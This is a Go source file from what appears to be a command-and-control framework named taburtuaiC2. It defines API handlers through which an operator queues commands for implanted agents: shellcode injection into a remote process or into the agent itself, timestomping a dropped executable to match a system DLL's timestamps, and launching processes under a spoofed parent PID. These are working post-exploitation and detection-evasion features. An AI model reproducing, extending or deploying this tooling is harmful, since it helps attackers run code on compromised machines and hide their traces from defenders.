package api

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/mjopsec/taburtuaiC2/internal/services"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// InjectRemote queues a shellcode injection into a remote process on the agent.
// POST /api/v1/agent/:id/inject/remote
// Body: { "shellcode_file": "/local/path/sc.bin", "pid": 1234, "method": "crt" }
// OR:   { "shellcode_b64": "<base64>", "pid": 1234, "method": "apc" }
func (h *Handlers) InjectRemote(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	var req struct {
		ShellcodeFile string `json:"shellcode_file"` // local path on the C2 server
		ShellcodeB64  string `json:"shellcode_b64"`  // pre-encoded base64
		PID           uint32 `json:"pid"             binding:"required"`
		Method        string `json:"method"` // crt | apc
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}

	b64, err := resolveShellcode(req.ShellcodeFile, req.ShellcodeB64)
	if err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, err.Error())
		return
	}

	method := req.Method
	if method == "" {
		method = "crt"
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "inject_remote",
		ShellcodeB64:  b64,
		InjectPID:     req.PID,
		InjectMethod:  method,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "INJECT_REMOTE",
		fmt.Sprintf("PID=%d method=%s size=%d bytes", req.PID, method, base64DecodedLen(b64)), true)

	h.APIResponse(c, true, "Injection queued", map[string]interface{}{
		"command_id": cmd.ID,
		"pid":        req.PID,
		"method":     method,
	}, "")
}

// InjectSelf queues fileless in-memory shellcode execution in the agent's own process.
// POST /api/v1/agent/:id/inject/self
// Body: { "shellcode_file": "/local/sc.bin" } OR { "shellcode_b64": "<base64>" }
func (h *Handlers) InjectSelf(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	var req struct {
		ShellcodeFile string `json:"shellcode_file"`
		ShellcodeB64  string `json:"shellcode_b64"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}

	b64, err := resolveShellcode(req.ShellcodeFile, req.ShellcodeB64)
	if err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, err.Error())
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "inject_self",
		ShellcodeB64:  b64,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "INJECT_SELF",
		fmt.Sprintf("fileless %d bytes", base64DecodedLen(b64)), true)

	h.APIResponse(c, true, "Self-injection queued", map[string]interface{}{
		"command_id": cmd.ID,
		"size_bytes": base64DecodedLen(b64),
	}, "")
}

// Timestomp queues a file timestamp modification on the agent.
// POST /api/v1/agent/:id/timestomp
// Body: { "target": "C:\\drop.exe", "ref": "C:\\Windows\\System32\\kernel32.dll" }
// OR:   { "target": "C:\\drop.exe", "time": "2021-06-15T09:00:00Z" }
func (h *Handlers) Timestomp(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	var req struct {
		Target string `json:"target" binding:"required"`
		Ref    string `json:"ref"`
		Time   string `json:"time"` // RFC3339
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}
	if err := validateFilePath(req.Target); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid target: %v", err))
		return
	}
	if req.Time != "" {
		if _, err := time.Parse(time.RFC3339, req.Time); err != nil {
			c.Status(http.StatusBadRequest)
			h.APIResponse(c, false, "", nil, "time must be RFC3339 (e.g. 2021-06-15T09:00:00Z)")
			return
		}
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "timestomp",
		SourcePath:    req.Target,
		TimestompRef:  req.Ref,
		TimestompTime: req.Time,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "TIMESTOMP", req.Target, true)

	h.APIResponse(c, true, "Timestomp queued", map[string]interface{}{
		"command_id": cmd.ID,
		"target":     req.Target,
	}, "")
}

// PPIDSpawn queues a process start with a spoofed parent PID.
// POST /api/v1/agent/:id/process/ppid
// Body: { "exe": "cmd.exe", "args": "/c whoami", "ppid": 1234 }
// OR:   { "exe": "cmd.exe", "args": "", "ppid_name": "explorer.exe" }
func (h *Handlers) PPIDSpawn(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	var req struct {
		Exe      string `json:"exe"      binding:"required"`
		Args     string `json:"args"`
		PPID     uint32 `json:"ppid"`
		PPIDName string `json:"ppid_name"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}
	if req.PPID == 0 && req.PPIDName == "" {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "ppid or ppid_name is required")
		return
	}

	cmd := &types.Command{
		ID:              uuid.New().String(),
		AgentID:         agentID,
		OperationType:   "process_start",
		ProcessPath:     req.Exe,
		ProcessArgs:     []string{req.Args},
		SpoofParentPID:  req.PPID,
		SpoofParentName: req.PPIDName,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "PPID_SPAWN",
		fmt.Sprintf("%s (ppid=%d / name=%s)", req.Exe, req.PPID, req.PPIDName), true)

	h.APIResponse(c, true, "PPID spawn queued", map[string]interface{}{
		"command_id": cmd.ID,
		"exe":        req.Exe,
	}, "")
}

// resolveShellcode returns base64-encoded shellcode from a local file or pre-encoded string.
func resolveShellcode(filePath, b64 string) (string, error) {
	if b64 != "" {
		if _, err := base64.StdEncoding.DecodeString(b64); err != nil {
			return "", fmt.Errorf("invalid shellcode_b64: %v", err)
		}
		return b64, nil
	}
	if filePath != "" {
		data, err := os.ReadFile(filePath)
		if err != nil {
			return "", fmt.Errorf("read shellcode_file: %v", err)
		}
		if len(data) == 0 {
			return "", fmt.Errorf("shellcode file is empty")
		}
		return base64.StdEncoding.EncodeToString(data), nil
	}
	return "", fmt.Errorf("shellcode_file or shellcode_b64 is required")
}

func base64DecodedLen(b64 string) int {
	n := len(b64) * 3 / 4
	for i := len(b64) - 1; i >= 0 && b64[i] == '='; i-- {
		n--
	}
	return n
}
